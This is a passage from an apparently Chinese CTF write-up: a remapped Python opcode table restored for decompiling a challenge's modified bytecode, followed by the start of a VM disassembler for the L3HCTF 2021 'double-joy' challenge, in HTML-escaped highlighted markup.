def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ROT_THREE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DUP_TOP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DUP_TOP_TWO&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NOP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UNARY_POSITIVE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UNARY_NEGATIVE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UNARY_NOT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UNARY_INVERT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_MATRIX_MULTIPLY&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_MATRIX_MULTIPLY&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_POWER&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;)              &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_FLOOR_DIVIDE      26&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_MULTIPLY&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;)           &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_SUBTRACT          24&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_MODULO&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;)             &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_ADD               23&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_ADD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;)                &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_XOR               65&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_SUBTRACT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;)           &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_MODULO            22&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_SUBSCR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_FLOOR_DIVIDE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;)       &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_POWER             19&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_TRUE_DIVIDE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;)        &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_MULTIPLY          20&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_FLOOR_DIVIDE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_TRUE_DIVIDE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET_AITER&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET_ANEXT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BEFORE_ASYNC_WITH&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_ADD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_SUBTRACT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_MULTIPLY&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_MODULO&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;STORE_SUBSCR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DELETE_SUBSCR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_LSHIFT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;)             &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_OR                66&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_RSHIFT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;)             &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_TRUE_DIVIDE       27&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_AND&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;)                &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_RSHIFT            63&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_XOR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;)                &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_LSHIFT            62&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_OR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)                 &lt;span style=&#34;color:#75715e&#34;&gt;#define BINARY_AND               64&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_POWER&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET_ITER&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET_YIELD_FROM_ITER&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PRINT_EXPR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_BUILD_CLASS&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;YIELD_FROM&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET_AWAITABLE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_LSHIFT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_RSHIFT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_AND&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_XOR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INPLACE_OR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BREAK_LOOP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;WITH_CLEANUP_START&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;WITH_CLEANUP_FINISH&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;RETURN_VALUE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IMPORT_STAR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;YIELD_VALUE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POP_BLOCK&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;END_FINALLY&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POP_EXCEPT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;)
HAVE_ARGUMENT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;STORE_NAME&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DELETE_NAME&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UNPACK_SEQUENCE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;)
jrel_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;FOR_ITER&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UNPACK_EX&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;STORE_ATTR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DELETE_ATTR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;STORE_GLOBAL&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DELETE_GLOBAL&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_CONST&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;)
hasconst&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_NAME&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_TUPLE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_LIST&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_SET&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_MAP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_ATTR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;COMPARE_OP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt;)
hascompare&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IMPORT_NAME&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IMPORT_FROM&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;)
jrel_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;JUMP_FORWARD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;)
jabs_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;JUMP_IF_FALSE_OR_POP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;)
jabs_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;JUMP_IF_TRUE_OR_POP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;)
jabs_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;JUMP_ABSOLUTE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;113&lt;/span&gt;)
jabs_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POP_JUMP_IF_FALSE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;)
jabs_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POP_JUMP_IF_TRUE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;)
name_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_GLOBAL&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;)
jabs_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CONTINUE_LOOP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;119&lt;/span&gt;)
jrel_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SETUP_LOOP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;)
jrel_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SETUP_EXCEPT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;)
jrel_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SETUP_FINALLY&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;122&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_FAST&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;)
haslocal&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;STORE_FAST&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;)
haslocal&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DELETE_FAST&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;126&lt;/span&gt;)
haslocal&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;126&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;RAISE_VARARGS&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;130&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CALL_FUNCTION&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;131&lt;/span&gt;)
hasnargs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;131&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;MAKE_FUNCTION&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;132&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_SLICE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;133&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;MAKE_CLOSURE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;134&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_CLOSURE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;135&lt;/span&gt;)
hasfree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;135&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_DEREF&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt;)
hasfree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;STORE_DEREF&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;137&lt;/span&gt;)
hasfree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;137&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DELETE_DEREF&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;138&lt;/span&gt;)
hasfree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;138&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CALL_FUNCTION_VAR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;140&lt;/span&gt;)
hasnargs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;140&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CALL_FUNCTION_KW&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;141&lt;/span&gt;)
hasnargs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;141&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CALL_FUNCTION_VAR_KW&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;142&lt;/span&gt;)
hasnargs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;142&lt;/span&gt;)
jrel_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SETUP_WITH&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;143&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LIST_APPEND&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;145&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SET_ADD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;146&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;MAP_ADD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;147&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_CLASSDEREF&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt;)
hasfree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt;)
jrel_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SETUP_ASYNC_WITH&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;154&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;EXTENDED_ARG&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt;)
EXTENDED_ARG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt;
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_LIST_UNPACK&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;149&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_MAP_UNPACK&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_MAP_UNPACK_WITH_CALL&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;151&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_TUPLE_UNPACK&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;152&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BUILD_SET_UNPACK&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; def_op
&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; name_op
&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; jrel_op
&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; jabs_op
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这下就很舒服了（如果全都改乱了，就得写个脚本全改回去了，不过这样的话这个程序是不是也看不懂了）&lt;/p&gt;
&lt;h2 id=&#34;l3hctf-2021double-joy&#34;&gt;[L3HCTF 2021]double-joy&lt;/h2&gt;
&lt;p&gt;恢复jmp表，发现是个vm，写一下反汇编&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;opcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len_op:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;590&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
    cur_op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; opcode[i]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
